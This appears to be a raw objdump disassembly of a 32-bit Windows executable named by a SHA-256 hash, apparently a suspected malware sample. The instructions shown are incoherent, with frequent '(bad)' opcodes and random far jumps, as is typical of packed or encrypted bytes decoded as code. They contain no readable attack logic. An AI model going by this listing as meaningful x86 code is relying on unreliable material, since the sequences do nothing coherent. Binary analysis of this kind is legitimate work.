
caa490c4d5674a7ed20d80090dfe1a868a4a1423235312956596f67b0eede601.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	xor    DWORD PTR [edi-0x3b68edae],eax
  411006:	xchg   ebx,eax
  411007:	push   ds
  411008:	out    dx,al
  411009:	lods   al,BYTE PTR ds:[esi]
  41100a:	hlt    
  41100b:	jg     0x411079
  41100d:	mov    cl,0xff
  41100f:	or     al,0x2d
  411011:	sub    al,BYTE PTR [ebx-0x123bbc6]
  411017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411018:	(bad)  
  411019:	pop    edi
  41101a:	(bad)  
  41101b:	mov    edi,0x31ffe442
  411020:	fmul   QWORD PTR [eax]
  411022:	or     eax,0xd4f61752
  411027:	(bad)  
  411028:	jge    0x41103c
  41102a:	imul   ecx,DWORD PTR [esi+0x57],0xbca39bb
  411031:	sbb    al,BYTE PTR [ecx+0x7a863c98]
  411037:	mov    bh,0xa7
  411039:	and    eax,0xfa97b50a
  41103e:	mov    ch,0xac
  411040:	mov    eax,ds:0x7066ea0f
  411045:	push   esi
  411046:	mov    ecx,0x722fe722
  41104b:	outs   dx,DWORD PTR ds:[esi]
  41104c:	pop    eax
  41104d:	stc    
  41104e:	call   0x5fff9fc9
  411053:	pop    esp
  411054:	inc    ecx
  411055:	cld    
  411056:	mov    edx,0x96433eb8
  41105b:	ret    0x8585
  41105e:	and    al,0x6f
  411060:	outs   dx,BYTE PTR ds:[esi]
  411061:	sub    BYTE PTR [ebp-0x3d4f6328],dl
  411067:	jnp    0x4110b4
  411069:	mov    WORD PTR [eax],cs
  41106b:	sub    eax,0x2cd73339
  411070:	dec    edi
  411071:	ds push ebp
  411073:	rcr    DWORD PTR [edx+edx*8-0x1b962427],0x1c
  41107b:	inc    edi
  41107c:	push   edi
  41107d:	pop    es
  41107e:	jb     0x4110ef
  411080:	arpl   WORD PTR [eax+0x1d],bp
  411083:	sub    BYTE PTR [edi+0x601a5707],dh
  411089:	dec    edx
  41108a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41108b:	shl    BYTE PTR [edi-0x74],cl
  41108e:	cmp    eax,0x7676f104
  411093:	cmp    BYTE PTR [ebx-0x7d],al
  411096:	push   esp
  411097:	das    
  411098:	sub    ecx,DWORD PTR cs:[edx+eax*8-0x4a24f299]
  4110a0:	hlt    
  4110a1:	les    ecx,FWORD PTR [edi+0x5e323985]
  4110a7:	popf   
  4110a8:	cmovge eax,DWORD PTR [eax+0x6c]
  4110ac:	xor    al,0x4e
  4110ae:	xchg   ebx,esp
  4110b0:	fadd   DWORD PTR [edx+0x68]
  4110b3:	rcl    dh,cl
  4110b5:	pop    edi
  4110b6:	in     eax,dx
  4110b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b8:	imul   BYTE PTR [ecx+0x4d]
  4110bb:	or     ebp,edx
  4110bd:	mov    al,0x5e
  4110bf:	into   
  4110c0:	inc    edi
  4110c1:	sub    DWORD PTR [edx-0x3543b15d],esp
  4110c7:	adc    ebp,DWORD PTR [esi+0x81aeb80]
  4110cd:	leave  
  4110ce:	mov    ecx,ecx
  4110d0:	or     BYTE PTR [ebp+0x74d0107e],bh
  4110d6:	add    eax,0xf9c17e5f
  4110db:	jg     0x4110d9
  4110dd:	pop    esi
  4110de:	cmp    eax,0x3d101ec2
  4110e3:	stos   BYTE PTR es:[edi],al
  4110e4:	leave  
  4110e5:	adc    esp,DWORD PTR [eax]
  4110e7:	pop    ebp
  4110e8:	icebp  
  4110e9:	fwait
  4110ea:	loope  0x411108
  4110ec:	inc    esp
  4110ed:	jle    0x4110a1
  4110ef:	aad    0xef
  4110f1:	pop    ss
  4110f2:	loop   0x41110b
  4110f4:	dec    eax
  4110f5:	mov    ebx,0xfd50c19a
  4110fa:	or     ah,ah
  4110fc:	outs   dx,DWORD PTR ds:[esi]
  4110fd:	hlt    
  4110fe:	imul   esp,DWORD PTR [edi],0x821fae95
  411104:	pslld  mm4,mm4
  411107:	stc    
  411108:	inc    BYTE PTR [edx+0x3832d097]
  41110e:	es jp  0x411146
  411111:	xor    eax,0x1d5a341f
  411116:	mov    ds:0x57770b1c,al
  41111b:	push   ebx
  41111c:	add    eax,0xc48060fa
  411121:	lods   al,BYTE PTR ds:[esi]
  411122:	jmp    DWORD PTR [ecx]
  411124:	push   ss
  411125:	leave  
  411126:	mov    dl,0xec
  411128:	aad    0x8f
  41112a:	in     al,0x1
  41112c:	hlt    
  41112d:	fldenv [edi-0xe8c9e94]
  411133:	sub    eax,0x52a5148b
  411138:	mov    al,0x6
  41113a:	mov    dh,0x7c
  41113c:	inc    esi
  41113d:	clc    
  41113e:	mov    ch,0xc8
  411140:	aaa    
  411141:	cmp    eax,0xa411737
  411146:	fwait
  411147:	push   0x24
  411149:	push   esi
  41114a:	(bad)  
  41114b:	fisubr DWORD PTR [edx+0x3]
  41114e:	push   esp
  41114f:	cmp    BYTE PTR [ecx],0x9e
  411152:	out    dx,eax
  411153:	cmp    eax,0xe00e87fd
  411158:	jbe    0x897ebc39
  41115e:	mov    al,ds:0xca8af054
  411163:	retf   0xd8f4
  411166:	sbb    BYTE PTR [ecx],0x2d
  411169:	add    al,0xd4
  41116b:	pop    ebx
  41116c:	(bad)  
  41116d:	stc    
  41116e:	(bad)  
  41116f:	mov    WORD PTR [ecx],cs
  411171:	and    ebx,DWORD PTR [ebp-0x755c72c3]
  411177:	ja     0x4111df
  411179:	ins    DWORD PTR es:[edi],dx
  41117a:	push   eax
  41117b:	push   esp
  41117c:	cmp    eax,DWORD PTR [eax+0x1a8c12e9]
  411182:	jmp    0x26f4:0x33e9b5be
  411189:	xor    al,0x45
  41118b:	and    dl,BYTE PTR [ebp+0x194251a9]
  411191:	cmp    ebp,ebp
  411193:	adc    esp,eax
  411195:	mov    cs,WORD PTR [ebp+0x719ca45f]
  41119b:	scas   eax,DWORD PTR es:[edi]
  41119c:	push   ds
  41119d:	fcmove st,st(3)
  41119f:	popf   
  4111a0:	pop    edi
  4111a1:	inc    edi
  4111a2:	addr16 inc ecx
  4111a4:	fisttp WORD PTR [ecx]
  4111a6:	sahf   
  4111a7:	sti    
  4111a8:	push   ecx
  4111a9:	ins    BYTE PTR es:[edi],dx
  4111aa:	cmp    BYTE PTR [eax-0x46],dh
  4111ad:	push   ss
  4111ae:	pop    ss
  4111af:	js     0x411132
  4111b1:	out    dx,al
  4111b2:	lock stc 
  4111b4:	mov    bl,0xf0
  4111b6:	lds    eax,FWORD PTR [eax-0x64]
  4111b9:	or     edx,ebx
  4111bb:	imul   edx,DWORD PTR [eax-0x2],0xffffffaf
  4111bf:	sbb    bl,BYTE PTR [ebp-0x5caf322c]
  4111c5:	fisubr WORD PTR [edi]
  4111c7:	ins    DWORD PTR es:[edi],dx
  4111c8:	jg     0x4111e9
  4111ca:	cdq    
  4111cb:	shl    BYTE PTR [edi],cl
  4111cd:	sbb    al,BYTE PTR [ecx+ebx*8-0x30]
  4111d1:	xor    al,0x4f
  4111d3:	pusha  
  4111d4:	ss mov ebx,0x2e8fba51
  4111da:	jle    0x4111bf
  4111dc:	bound  edi,QWORD PTR [esi]
  4111de:	or     BYTE PTR [esi-0x55],ah
  4111e1:	shl    DWORD PTR [ecx+0x6863f6da],0x37
  4111e8:	stos   DWORD PTR es:[edi],eax
  4111e9:	inc    esi
  4111ea:	ffreep st(6)
  4111ec:	add    al,0x8b
  4111ee:	stc    
  4111ef:	ins    DWORD PTR es:[edi],dx
  4111f0:	popf   
  4111f1:	adc    eax,0xd24da054
  4111f6:	sbb    eax,0x12eb0f76
  4111fb:	xchg   BYTE PTR [ebx+0x445f0f8d],cl
  411201:	neg    cl
  411203:	leave  
  411204:	xchg   edi,eax
  411205:	mov    eax,0xe8e9aa46
  41120a:	pop    eax
  41120b:	dec    edx
  41120c:	mov    bh,0xd2
  41120e:	scas   eax,DWORD PTR es:[edi]
  41120f:	inc    ebx
  411210:	inc    edx
  411211:	dec    ebp
  411212:	shr    DWORD PTR [eax],cl
  411214:	pop    edi
  411215:	and    eax,0x1aebff54
  41121a:	ret    
  41121b:	mov    edi,0x58932ab4
  411220:	addr16 jl 0x411245
  411223:	sub    BYTE PTR [edi+0xf85c712],ah
  411229:	mov    eax,0xa44e306d
  41122e:	ja     0x4111c9
  411230:	imul   edi,DWORD PTR [ebx],0x17908c74
  411236:	call   DWORD PTR [ebx-0x7c]
  411239:	xor    al,0x13
  41123b:	in     al,dx
  41123c:	pop    edx
  41123d:	xor    bh,BYTE PTR [edi]
  41123f:	outs   dx,BYTE PTR ds:[esi]
  411240:	(bad)  
  411241:	stos   DWORD PTR es:[edi],eax
  411242:	push   ebp
  411243:	es sub ah,cl
  411246:	inc    ecx
  411247:	jno    0x4111f9
  411249:	out    dx,al
  41124a:	das    
  41124b:	pushf  
  41124c:	fild   DWORD PTR [esp+ecx*1-0x495e4a99]
  411253:	lock xchg ebx,eax
  411255:	push   esp
  411256:	out    0x1f,al
  411258:	jbe    0x4112d4
  41125a:	out    0xbb,al
  41125c:	lock sbb al,0xab
  41125f:	adc    al,BYTE PTR [edx-0x1f]
  411262:	into   
  411263:	jle    0x411205
  411265:	pop    eax
  411266:	jmp    0x411237
  411268:	push   ecx
  411269:	jns    0x411255
  41126b:	out    dx,al
  41126c:	ror    DWORD PTR [edi+0x2d4c2cea],cl
  411272:	xchg   esp,eax
  411273:	inc    edi
  411274:	retf   0x38a5
  411277:	test   BYTE PTR [edx-0x32be832d],cl
  41127d:	mov    cl,BYTE PTR [edx-0x174d3297]
  411283:	cdq    
  411284:	or     eax,DWORD PTR [ecx-0x5]
  411287:	pop    es
  411288:	fsub   QWORD PTR [edi+0x5a]
  41128b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41128c:	xchg   ecx,eax
  41128d:	push   esi
  41128e:	mov    cs,WORD PTR [ebx+0x3b]
  411291:	mov    esi,0x7e5b2f32
  411296:	lock or edi,DWORD PTR ds:0x4de11f04
  41129d:	mov    es,WORD PTR [eax-0x6b]
  4112a0:	pop    esp
  4112a1:	cmp    BYTE PTR [esi-0x132e0c93],ch
  4112a7:	xor    al,0x70
  4112a9:	xor    bh,BYTE PTR [edx]
  4112ab:	pop    edi
  4112ac:	xor    BYTE PTR [esp+ecx*2+0x31],ah
  4112b0:	sub    eax,0xcc37ed13
  4112b5:	aaa    
  4112b6:	jmp    0x41127f
  4112b8:	sub    DWORD PTR [edi],edi
  4112ba:	mov    ebx,es
  4112bc:	mov    dh,al
  4112be:	xor    BYTE PTR [edx],ch
  4112c0:	js     0x411313
  4112c2:	push   ss
  4112c3:	aaa    
  4112c4:	inc    ebp
  4112c5:	das    
  4112c6:	repz les esp,FWORD PTR [ebp+0x16]
  4112ca:	test   DWORD PTR [edi],eax
  4112cc:	cmc    
  4112cd:	retf   
  4112ce:	popf   
  4112cf:	in     eax,0xbf
  4112d1:	mov    eax,0x37f912ec
  4112d6:	jmp    0xdec1:0x46c5e295
  4112dd:	mov    ebx,0xbdaa8b4
  4112e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112e3:	mov    al,ds:0x53953503
  4112e8:	jmp    DWORD PTR [edi-0x67b3b1c3]
  4112ee:	add    DWORD PTR [ebp+0x49],eax
  4112f1:	jmp    DWORD PTR [edi]
  4112f3:	cs pop ss
  4112f5:	cmp    cl,0x2b
  4112f8:	loop   0x411369
  4112fa:	and    eax,0xf50bfe01
  4112ff:	pop    edi
  411300:	dec    esp
  411301:	mov    bh,ch
  411303:	scas   eax,DWORD PTR es:[edi]
  411304:	mov    ss,WORD PTR [edi+0x329dabcb]
  41130a:	mov    eax,ds:0x5c9e2a6c
  41130f:	pusha  
  411310:	sti    
  411311:	outs   dx,BYTE PTR ds:[esi]
  411312:	push   ebx
  411313:	fisub  WORD PTR [edx+ebp*8+0x7e50eb65]
  41131a:	hlt    
  41131b:	icebp  
  41131c:	push   esp
  41131d:	sub    ah,0xfa
  411320:	jg     0x411353
  411322:	sbb    al,0x67
  411325:	pop    edi
  411326:	xor    esi,DWORD PTR [edi]
  411328:	ds (bad) 
  41132a:	(bad)  
  41132b:	push   edi
  41132c:	lea    eax,[esi+eax*8-0x5ebc5f4c]
  411333:	xchg   edx,eax
  411334:	add    BYTE PTR [ecx-0x4d948b58],bl
  41133a:	lock (bad) 
  41133c:	push   0x1a
  41133e:	stos   DWORD PTR es:[edi],eax
  41133f:	xchg   DWORD PTR [ecx+0x1f64949c],ebp
  411345:	(bad)  
  411346:	aaa    
  411347:	mov    DWORD PTR [eax-0x69],esi
  41134a:	ret    0x6c95
  41134d:	fistp  WORD PTR [edi-0x33]
  411350:	mov    dl,0x8
  411352:	dec    esi
  411353:	push   ebx
  411354:	mov    eax,DWORD PTR [edi+ebx*1-0x18815844]
  41135b:	(bad)
  41135e:	(bad)  
  41135f:	and    ah,bh
  411361:	push   ds
  411362:	and    DWORD PTR [edx],edi
  411364:	adc    BYTE PTR [eax+0x3b],bl
  411367:	fcmove st,st(5)
  411369:	pushf  
  41136a:	sub    DWORD PTR [edx-0xf],esp
  41136d:	pop    ecx
  41136e:	jae    0x4113dd
  411370:	add    DWORD PTR [eax+eiz*8],ebp
  411373:	push   ds
  411374:	add    al,BYTE PTR [ecx+0x2887656]
  41137a:	rcl    DWORD PTR [ebx-0x79],cl
  41137d:	cli    
  41137e:	add    ah,BYTE PTR [esi-0x3a]
  411381:	add    al,BYTE PTR [eax-0x34]
  411384:	fwait
  411385:	test   bh,ch
  411387:	(bad)
  41138b:	cmp    edx,edx
  41138d:	stc    
  41138e:	mov    ebx,0x76487ad5
  411393:	loope  0x4113d8
  411395:	retf   
  411396:	aad    0x8b
  411398:	lock into 
  41139a:	ret    0x5264
  41139d:	jbe    0x4113b1
  41139f:	test   eax,0x75d4f80a
  4113a4:	inc    ebp
  4113a5:	inc    esp
  4113a6:	shl    BYTE PTR [edi+esi*2],cl
  4113a9:	pop    eax
  4113aa:	lea    edx,[ecx+0x1c1a34b1]
  4113b0:	stos   BYTE PTR es:[edi],al
  4113b1:	mov    bl,0x2f
  4113b3:	out    0xe4,al
  4113b5:	mov    ebx,0x2130c54d
  4113ba:	pop    edi
  4113bb:	bound  eax,QWORD PTR [edi+0x3]
  4113be:	push   ebx
  4113bf:	sub    BYTE PTR [edi+0x7a],bl
  4113c2:	mov    edx,0x69667b9
  4113c7:	pop    esi
  4113c8:	aam    0xce
  4113ca:	fsubp  st(5),st
  4113cc:	sub    edx,DWORD PTR ds:0x59a9959a
  4113d2:	adc    al,0x93
  4113d4:	cmp    dl,bl
  4113d6:	fnsave [edi+edi*1-0x35]
  4113da:	cwde   
  4113db:	gs push ecx
  4113dd:	shl    DWORD PTR [eax+0x42],0x92
  4113e1:	in     al,0x15
  4113e3:	outs   dx,DWORD PTR ds:[esi]
  4113e4:	fcomp  DWORD PTR [ecx+0x7985ab30]
  4113ea:	lods   eax,DWORD PTR ds:[esi]
  4113eb:	xchg   ebx,eax
  4113ec:	pop    esp
  4113ed:	xor    eax,0xc27442dd
  4113f2:	mov    edi,0xa85886ee
  4113f7:	push   0xc737d7e1
  4113fc:	lods   al,BYTE PTR ds:[esi]
  4113fd:	adc    edi,eax
  4113ff:	xchg   esi,eax
  411400:	jb     0x4113c2
  411402:	call   0x8f35:0x17fe77a1
  411409:	xor    esp,esi
  41140b:	add    DWORD PTR [edx+0x2e],eax
  41140e:	cmp    DWORD PTR [edi],edx
  411410:	sbb    al,0x82
  411412:	mov    edi,0xff0fa8d3
  411417:	mov    ch,bl
  411419:	inc    ebx
  41141a:	pop    ds
  41141b:	or     BYTE PTR ds:0x78c5af59,ch
  411421:	loop   0x4113d2
  411423:	jae    0x411472
  411425:	repz jge 0x4114a6
  411428:	adc    eax,0xed6721c3
  41142d:	out    0x23,eax
  41142f:	jecxz  0x41149a
  411431:	jmp    0x411420
  411433:	out    dx,eax
  411434:	add    al,cl
  411436:	xchg   esi,eax
  411437:	sbb    BYTE PTR [esi-0x1a],dl
  41143a:	adc    bh,BYTE PTR [ebx-0x5e]
  41143d:	push   edx
  41143e:	fisttp QWORD PTR [eax]
  411440:	fstp   TBYTE PTR [edx-0x52842a00]
  411446:	mov    eax,0xbba6bde
  41144b:	fld    QWORD PTR [ecx]
  41144d:	lods   al,BYTE PTR ds:[esi]
  41144e:	lea    eax,ds:0x9673bcda
  411454:	or     ebx,DWORD PTR [ecx+0x1420d31b]
  41145a:	scas   al,BYTE PTR es:[edi]
  41145b:	aad    0xe1
  41145d:	adc    al,0x90
  41145f:	scas   eax,DWORD PTR es:[edi]
  411460:	jb     0x411408
  411462:	es stos DWORD PTR es:[edi],eax
  411464:	ins    DWORD PTR es:[edi],dx
  411465:	cmp    cl,cl
  411467:	inc    esi
  411468:	popf   
  411469:	inc    ecx
  41146a:	(bad)  
  41146b:	mov    ebx,0x92cce301
  411470:	and    BYTE PTR [esp+edi*2+0x671b148b],ch
  411477:	test   al,0xf4
  411479:	dec    esi
  41147b:	pop    edx
  41147d:	or     BYTE PTR [esi-0xc],0x8
  411481:	pop    esi
  411482:	dec    ecx
  411483:	outs   dx,DWORD PTR ds:[esi]
  411484:	push   0xd6d95db3
  411489:	push   eax
  41148a:	(bad)  
  41148b:	mov    cl,0xc4
  41148d:	and    BYTE PTR [edi+0x61a209ab],dl
  411493:	xor    al,0x49
  411495:	mov    BYTE PTR [esi],dh
  411497:	cld    
  411498:	not    esi
  41149a:	rol    BYTE PTR [ebx+0x4b236e8a],1
  4114a0:	arpl   WORD PTR [ecx+0x3667bab],bx
  4114a6:	and    al,0x17
  4114a8:	aaa    
  4114a9:	stos   DWORD PTR es:[edi],eax
  4114aa:	(bad)  
  4114ab:	cmp    ah,bl
  4114ad:	outs   dx,BYTE PTR ds:[esi]
  4114ae:	jbe    0x4114be
  4114b0:	adc    DWORD PTR [eax-0x51f5e075],ecx
  4114b6:	jmp    0x7ffb6946
  4114bb:	pop    eax
  4114bc:	jnp    0x4114f9
  4114be:	icebp  
  4114bf:	and    DWORD PTR [edi-0x4],eax
  4114c2:	fldenv [ebp+0x7d]
  4114c5:	adc    BYTE PTR [edx+edi*2],bh
  4114c8:	jnp    0x411458
  4114ca:	cmp    DWORD PTR [edx],esp
  4114cc:	call   esp
  4114ce:	outs   dx,DWORD PTR ds:[esi]
  4114cf:	cmp    ebx,DWORD PTR [edx]
  4114d1:	push   0xffffffae
  4114d3:	gs jp  0x41152d
  4114d6:	xor    eax,0x5dbc7100
  4114db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114dc:	jbe    0x411517
  4114de:	adc    DWORD PTR [ebx+0x11b6bf38],edi
  4114e4:	sub    al,0xed
  4114e6:	mov    ds:0xdff7b0bb,eax
  4114eb:	test   eax,0x98f7c175
  4114f0:	scas   eax,DWORD PTR es:[edi]
  4114f1:	in     al,dx
  4114f2:	jmp    0x2a81:0xb76c1963
  4114f9:	loopne 0x411552
  4114fb:	outs   dx,BYTE PTR ds:[esi]
  4114fc:	jmp    0xa31f18d7
  411501:	ss or  al,0x70
  411504:	loopne 0x4114d8
  411506:	push   edx
  411507:	cmp    dl,BYTE PTR [ebp+0x66]
  41150a:	pop    edx
  41150b:	pop    ebx
  41150c:	mov    edx,0x14c086b6
  411511:	(bad)  
  411512:	or     ah,BYTE PTR [esi]
  411514:	adc    BYTE PTR [edx-0x4c415c0b],dl
  41151a:	add    eax,0xb7bd7a0c
  41151f:	xchg   edx,eax
  411520:	add    dl,BYTE PTR [ebp-0x39d8dca9]
  411526:	mov    ebp,0x75b9bb23
  41152b:	dec    eax
  41152c:	aaa    
  41152d:	scas   eax,DWORD PTR es:[edi]
  41152e:	mov    eax,DWORD PTR [eax-0x77]
  411531:	out    dx,al
  411532:	lock adc DWORD PTR [edx],ecx
  411535:	xor    esp,esp
  411537:	push   ds
  411538:	xlat   BYTE PTR ds:[ebx]
  411539:	and    al,0xf2
  41153b:	xchg   DWORD PTR [ecx+0x47],ecx
  41153e:	arpl   ax,sp
  411540:	dec    edx
  411541:	test   eax,ebp
  411543:	xchg   esp,eax
  411544:	ror    BYTE PTR [esi+0x8],1
  411547:	les    esi,FWORD PTR [ecx+0x2d]
  41154a:	test   ebp,ebx
  41154c:	mov    ch,0xde
  41154e:	call   0xbced:0x712efb96
  411555:	push   esp
  411556:	imul   edx,DWORD PTR [edx-0x15bf3099],0xffffffe4
  41155d:	outs   dx,DWORD PTR ds:[esi]
  41155e:	jno    0x4114fa
  411560:	and    ecx,DWORD PTR [ebx+ebx*4]
  411563:	fsubr  st,st(1)
  411565:	push   ebx
  411566:	addr16 xchg ebx,eax
  411568:	mov    ds:0x174c9e73,al
  41156d:	jg     0x411579
  41156f:	cmp    DWORD PTR [ebx+0x44],0x4b
  411573:	int3   
  411574:	push   edi
  411575:	push   0x6e
  411577:	dec    edi
  411578:	jo     0x411561
  41157a:	imul   ecx,DWORD PTR [edx-0x322a2740],0xec5327b8
  411584:	popf   
  411585:	aaa    
  411586:	div    DWORD PTR ds:0x724b2a9
  41158c:	push   edx
  41158d:	ror    DWORD PTR [edx-0x4a4e9b54],1
  411593:	and    BYTE PTR [ebp+edx*4-0x19d63dde],ch
  41159a:	rcr    BYTE PTR [edx],1
  41159c:	cmp    DWORD PTR [esi+0x5e8ca99f],ebp
  4115a2:	aam    0x4b
  4115a4:	js     0x411539
  4115a6:	mov    ch,0xce
  4115a8:	fstp   DWORD PTR [edx]
  4115aa:	dec    edi
  4115ab:	jmp    0xe4be3970
  4115b0:	pushf  
  4115b1:	push   0x56a2364d
  4115b6:	clc    
  4115b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b9:	idiv   DWORD PTR [ecx-0x1f]
  4115bc:	lock rol ch,1
  4115bf:	imul   edx,DWORD PTR [eax+0x492ef9e0],0x51c2c0a1
  4115c9:	stc    
  4115ca:	and    al,0x64
  4115cc:	inc    ebp
  4115cd:	js     0x411601
  4115cf:	jb     0x4115a6
  4115d1:	xor    DWORD PTR [ecx-0x31],ebx
  4115d4:	std    
  4115d5:	xchg   edi,eax
  4115d6:	adc    al,0xa9
  4115d8:	pop    ecx
  4115d9:	xlat   BYTE PTR ds:[ebx]
  4115da:	adc    cl,BYTE PTR [ebp+0x2f34526d]
  4115e0:	(bad)  
  4115e1:	or     al,0x5b
  4115e3:	fnsave [ecx+0x43f65772]
  4115e9:	jg     0x411660
  4115eb:	call   ebp
  4115ed:	xabort 0x25
  4115f0:	pop    es
  4115f1:	push   cs
  4115f2:	pusha  
  4115f3:	lods   al,BYTE PTR ds:[esi]
  4115f4:	jns    0x4115ba
  4115f6:	and    edx,DWORD PTR [eax+0x5a01b355]
  4115fc:	test   al,0xe9
  4115fe:	bound  esp,QWORD PTR ds:0x2d23540
  411604:	icebp  
  411605:	repnz imul BYTE PTR [ecx]
  411608:	pop    esp
  411609:	and    DWORD PTR [esi],esp
  41160b:	sub    al,0x5d
  41160d:	inc    edx
  41160e:	sar    BYTE PTR [ecx-0x39],1
  411611:	xor    dh,BYTE PTR [esp+edi*1+0x4649af96]
  411618:	dec    DWORD PTR ds:[esi+0xb7c45d5]
  41161f:	iret   
  411620:	aam    0xd0
  411622:	test   eax,0x2c4dbc25
  411627:	sbb    cl,al
  411629:	cs jbe 0x411622
  41162c:	pusha  
  41162d:	cwde   
  41162e:	add    al,BYTE PTR ds:0x6b05d79b
  411634:	in     eax,0xb2
  411636:	(bad)  
  411637:	mov    bl,0xeb
  411639:	inc    esp
  41163a:	sbb    eax,0xb6d40b91
  41163f:	je     0x411690
  411641:	push   ebx
  411642:	jge    0x41160a
  411644:	repz jg 0x41167e
  411647:	sbb    eax,0x4a139530
  41164c:	cmp    BYTE PTR [ecx+0x2c],dl
  41164f:	aad    0xac
  411651:	repz jecxz 0x41166e
  411654:	push   cs
  411655:	shl    ebp,cl
  411657:	(bad)  
  411658:	mov    eax,0x53846f3b
  41165d:	bound  esp,QWORD PTR [ebx+0x6b9cc85d]
  411663:	jo     0x411630
  411665:	or     eax,0xfba6832d
  41166a:	mov    esi,0x9cf9d8a6
  41166f:	test   al,0x81
  411671:	or     al,0xa2
  411673:	out    0x58,eax
  411675:	add    ecx,DWORD PTR [esi+0x618fbdce]
  41167b:	aas    
  41167c:	xor    DWORD PTR [eax+0x1a967ba1],0x4b
  411683:	dec    ebx
  411684:	gs (bad) 
  411686:	fstp   DWORD PTR [edx]
  411688:	cdq    
  411689:	arpl   WORD PTR [ebx+edi*8-0x4e],dx
  41168d:	enter  0xd983,0x1d
  411691:	rcl    DWORD PTR [ebx],1
  411693:	ins    DWORD PTR es:[edi],dx
  411694:	jno    0x4116c3
  411696:	sbb    eax,0x8ed9c177
  41169b:	jge    0x4116ff
  41169d:	lods   eax,DWORD PTR ds:[esi]
  41169e:	xchg   DWORD PTR [edx-0x43],eax
  4116a1:	pusha  
  4116a2:	cmp    al,bh
  4116a4:	xchg   esi,eax
  4116a5:	ret    0x957f
  4116a8:	pop    es
  4116a9:	int    0xda
  4116ab:	shr    DWORD PTR [edi-0x2475aa8],cl
  4116b1:	mov    ?,WORD PTR [eax+0xb320856]
  4116b7:	stos   DWORD PTR es:[edi],eax
  4116b8:	std    
  4116b9:	and    DWORD PTR [eax],0x56
  4116bc:	aam    0xeb
  4116be:	sbb    dh,BYTE PTR [eax-0x1696232a]
  4116c4:	out    dx,al
  4116c5:	cmp    al,0x73
  4116c7:	in     al,dx
  4116c8:	mov    bl,0x69
  4116ca:	in     eax,0xd6
  4116cc:	sti    
  4116cd:	les    ebp,FWORD PTR [edx+0x1a]
  4116d0:	jb     0x411701
  4116d2:	repz cmp al,0xcf
  4116d5:	add    al,0x80
  4116d7:	(bad)  
  4116d8:	lds    ecx,FWORD PTR [esi+0x172b1865]
  4116de:	jle    0x41174f
  4116e0:	inc    ebp
  4116e1:	aas    
  4116e2:	xor    al,BYTE PTR [ecx+0x25]
  4116e5:	jno    0x411678
  4116e7:	jne    0x4116b1
  4116e9:	ins    DWORD PTR es:[edi],dx
  4116ea:	pop    es
  4116eb:	fwait
  4116ec:	mov    WORD PTR ds:0x3485e0fe,ds
  4116f2:	push   ecx
  4116f3:	out    0x7,eax
  4116f5:	test   BYTE PTR [edi+0xf],cl
  4116f8:	jmp    0x2b16:0xba3a5011
  4116ff:	repz bnd jno 0x411703
  411703:	(bad)  [ebx+0xd02f66b]
  411709:	aaa    
  41170a:	mov    al,0x4c
  41170c:	pop    edi
  41170d:	mov    WORD PTR [eax],ss
  41170f:	mov    ebx,0xe0eec7e0
  411714:	fwait
  411715:	mov    ?,esi
  411717:	imul   esi,DWORD PTR [edx],0x6a
  41171a:	inc    esi
  41171b:	test   DWORD PTR [ecx+0xa],ecx
  41171e:	test   DWORD PTR [ecx],0xc256e0c4
  411724:	sbb    bl,BYTE PTR [ebx+0x74e83d23]
  41172a:	dec    ecx
  41172b:	dec    eax
  41172c:	imul   DWORD PTR [ecx-0x2d10bffb]
  411732:	shr    BYTE PTR [ebp+0x5e43d1aa],0x1c
  411739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41173a:	push   cs
  41173b:	ins    DWORD PTR es:[edi],dx
  41173c:	mov    ah,0x77
  41173e:	dec    edi
  41173f:	(bad)  
  411740:	data16 mov bh,0xcd
  411743:	adc    ah,ch
  411745:	fstp   st(5)
  411747:	pop    eax
  411748:	xchg   DWORD PTR [ebp+0x2e],edx
  41174b:	and    ebp,DWORD PTR [esp+eax*8+0x1e]
  41174f:	cmp    eax,0xff6153c7
  411754:	xor    DWORD PTR [ebx],edi
  411756:	mov    ch,BYTE PTR [ebp+0x6284e206]
  41175c:	jp     0x411787
  41175e:	adc    eax,0x53ec455
  411763:	pop    es
  411764:	dec    eax
  411765:	repz xor dl,BYTE PTR [ebx-0x6d]
  411769:	out    dx,eax
  41176a:	stos   DWORD PTR es:[edi],eax
  41176b:	cmp    DWORD PTR [eax+eax*2-0x79],0x55685852
  411773:	add    BYTE PTR [ebp-0x1f],bh
  411776:	mov    edx,ecx
  411778:	and    edx,DWORD PTR [edi-0x3415fb6c]
  41177e:	xchg   ebx,eax
  41177f:	sbb    esi,ebx
  411781:	div    DWORD PTR [ebx+ecx*1]
  411784:	js     0x41178b
  411786:	jmp    0x41177f
  411788:	bound  ebx,QWORD PTR [ecx]
  41178a:	data16 cmp ah,BYTE PTR [ebx+0x1c26944d]
  411791:	adc    BYTE PTR [eax],ch
  411793:	dec    ecx
  411794:	pusha  
  411795:	push   esi
  411796:	inc    edi
  411797:	test   al,0x48
  411799:	call   0xdafc:0xd08fc1f7
  4117a0:	adc    eax,0x750b4eb9
  4117a5:	outs   dx,DWORD PTR ds:[esi]
  4117a6:	xchg   edx,eax
  4117a7:	scas   al,BYTE PTR es:[edi]
  4117a8:	loope  0x41178d
  4117aa:	icebp  
  4117ab:	out    dx,eax
  4117ac:	pop    ebx
  4117ad:	jo     0x411804
  4117af:	mov    ch,0xa
  4117b1:	mov    al,0x52
  4117b3:	ja     0x411758
  4117b5:	mov    esi,0x318875bd
  4117ba:	adc    ch,bl
  4117bc:	cdq    
  4117bd:	sub    DWORD PTR [edi-0x2a],edi
  4117c0:	inc    ebx
  4117c1:	mov    ds:0xbc1d2126,al
  4117c6:	(bad)  
  4117c7:	dec    esi
  4117c8:	shr    DWORD PTR [ebx-0x57],1
  4117cb:	xchg   esi,eax
  4117cc:	xchg   edx,eax
  4117cd:	in     al,dx
  4117ce:	lods   eax,DWORD PTR ds:[esi]
  4117cf:	jno    0x411788
  4117d1:	sbb    BYTE PTR [esi+0x332e7590],cl
  4117d7:	test   eax,0x2f4ee298
  4117dc:	xor    DWORD PTR [ebx-0x2fdd3038],ecx
